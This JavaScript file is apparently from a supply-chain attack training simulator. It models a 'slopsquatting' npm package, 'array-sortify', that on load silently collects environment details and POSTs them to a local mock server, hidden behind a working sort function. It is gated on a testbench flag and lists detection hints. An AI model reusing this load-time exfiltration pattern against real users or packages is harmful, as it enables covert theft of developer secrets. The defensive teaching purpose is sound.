/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori — Supply Chain Attack Simulator
 * Scenario 24: Slopsquatting
 *
 * MALICIOUS `array-sortify` package — EDUCATIONAL USE ONLY
 *
 * This package simulates one an attacker published after an LLM hallucinated
 * the name `array-sortify` in a README or Stack Overflow answer. The victim
 * copies `npm install array-sortify` and pulls this payload.
 *
 * SAFETY FEATURES:
 *   - Hard-gated on TESTBENCH_MODE=enabled
 *   - Exfiltrates only to 127.0.0.1:3024 (mock server)
 *   - Collects only low-sensitivity environment metadata
 *
 * DETECTION HINTS:
 *   1. Network request on module load
 *   2. Access to process.env
 *   3. Silent try/catch around the exfiltration call
 *   4. Package name with no established maintainers or download history
 */

'use strict';

const http = require('http');

function exfiltrateInstallBeacon() {
    // SAFETY CHECK: only run in the testbench environment
    if (process.env.TESTBENCH_MODE !== 'enabled') {
        console.log('[SAFE MODE] array-sortify: malicious behavior prevented');
        return;
    }

    console.log('[TESTBENCH] array-sortify: simulating install-time beacon...');

    const dataToExfiltrate = {
        scenario: '24',
        event_type: 'install_beacon',
        source: 'array-sortify',
        attack_vector: 'slopsquatting',
        destination: '127.0.0.1:3024',
        timestamp: new Date().toISOString(),
        package: {
            name: 'array-sortify',
            version: '1.0.0',
            installedAt: new Date().toISOString()
        },
        environment: {
            NODE_ENV: process.env.NODE_ENV || '(not set)',
            PWD: process.env.PWD || '(not set)',
            USER: process.env.USER || '(not set)',
            GITHUB_TOKEN: process.env.GITHUB_TOKEN ? '[REDACTED-lab]' : '(not set)'
        },
        system: {
            platform: process.platform,
            nodeVersion: process.version,
            cwd: process.cwd()
        }
    };

    const payload = JSON.stringify(dataToExfiltrate);
    const options = {
        hostname: '127.0.0.1',
        port: 3024,
        path: '/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = http.request(options, () => {
        console.log('[TESTBENCH] array-sortify: exfil beacon sent to mock server');
    });

    req.on('error', (e) => {
        // Real malware silently fails; in the lab we log for learning
        console.log('[TESTBENCH] array-sortify: mock server not available:', e.message);
    });

    req.write(payload);
    req.end();

    try {
        const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
        uploadJson('24', 'install-beacon', dataToExfiltrate);
    } catch (_) {}
}

// Malicious code executes as soon as the package is required
try {
    exfiltrateInstallBeacon();
} catch (_) {
    // Silent catch avoids crashing the victim app
}

// ============================================================================
// LEGITIMATE CODE SECTION
// ============================================================================
// The package must appear to work, otherwise the victim would notice.

function sort(input) {
    if (!Array.isArray(input)) {
        throw new TypeError('array-sortify expected an array');
    }
    return input.slice().sort((a, b) => a - b);
}

module.exports = { sort };
